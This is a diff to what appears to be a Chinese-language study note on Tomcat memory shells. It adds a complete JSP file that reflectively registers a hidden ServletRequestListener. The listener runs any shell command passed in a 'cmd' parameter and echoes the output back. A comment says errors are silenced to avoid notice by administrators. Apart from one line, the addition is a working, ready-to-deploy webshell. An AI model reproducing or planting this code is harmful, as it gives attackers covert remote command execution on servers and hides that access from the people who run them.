@@ -257,9 +257,76 @@ try {
 ---
 
 ok最终调用 `standardContext`的 `addApplicationEventListener()`添加我们自己的listener
+```jsp
+<%@ page import="java.lang.reflect.Field" %>  
+<%@ page import="java.lang.reflect.Method" %>  
+<%@ page import="java.io.InputStream" %>  
+<%@ page import="org.apache.catalina.core.ApplicationContext" %>  
+<%@ page import="org.apache.catalina.core.StandardContext" %>  
+<%@ page import="java.util.Scanner" %><%--  
+  Created by IntelliJ IDEA.  User: point  Date: 2026/1/6  Time: 21:29  To change this template use File | Settings | File Templates.--%>  
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>  
+<%! class ListenerShell implements ServletRequestListener{  
+    @Override  
+    public void requestDestroyed(ServletRequestEvent sre) {  
+  
+    }  
+    @Override  
+    public void requestInitialized(ServletRequestEvent sre) {  
+        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();        String cmd = request.getParameter("cmd");  
+  
+        if (cmd != null && !cmd.isEmpty()) {  
+            try {  
+                // 1. 判定操作系统逻辑 [引用第一个代码片段的逻辑]  
+                String osTyp = System.getProperty("os.name");  
+                boolean isLinux = true;  
+                if (osTyp != null && osTyp.toLowerCase().contains("win")) {  
+                    isLinux = false;  
+                }  
+                // 根据 OS 构造命令数组，确保管道符、重定向等能正常工作  
+                String[] cmds = isLinux ?  
+                        new String[]{"/bin/sh", "-c", cmd} :  
+                        new String[]{"cmd.exe", "/c", cmd};  
+  
+                // 2. 执行命令  
+                InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();  
+                Scanner s = new Scanner(inputStream).useDelimiter("\\A");  
+                String output = s.hasNext() ? s.next() : "";  
+  
+                // 3. 反射获取 Response 对象实现回显  
+                // 拿到 RequestFacade 内部的 Request 对象  
+                Field requestField = request.getClass().getDeclaredField("request");  
+                requestField.setAccessible(true);  
+                Object connectorRequest = requestField.get(request);  
+                // 调用 getContext() 并通过它拿到 Response (Tomcat 底层 Request 有 getResponse 方法)  
+                Method getResponseMethod = connectorRequest.getClass().getMethod("getResponse");  
+                Object connectorResponse = getResponseMethod.invoke(connectorRequest);  
+                // 获取 Writer 并输出结果  
+                java.io.PrintWriter writer = (java.io.PrintWriter) connectorResponse.getClass().getMethod("getWriter").invoke(connectorResponse);  
+                writer.write(output);                writer.write("\r\n"); // 换行增加可读性  
+                writer.flush();  
+  
+            } catch (Exception e) {  
+                // 静默处理或简单记录，避免抛出异常被管理员发现  
+            }  
+        }    }}  
+%>  
+<%  
+    ServletContext servletContext = request.getSession().getServletContext();//先通过session拿到ServletContext ，本质是ApplicationContextFacade的马甲类  
+  
+    //通过反射访问私有属性context，拿到了ApplicationContext  
+    Field appctx = servletContext.getClass().getDeclaredField("context");  
+    appctx.setAccessible(true);  
+    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
+    //再次反射拿StandardContext  
+    Field stdctx = applicationContext.getClass().getDeclaredField("context");  
+    stdctx.setAccessible(true);  
+    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
+    ListenerShell listenerShell = new ListenerShell();  
+    standardContext.addApplicationEventListener(listenerShell);%>
+```
 
-
-
+![](picture/Pasted%20image%2020260106214431.png)
 
 
 
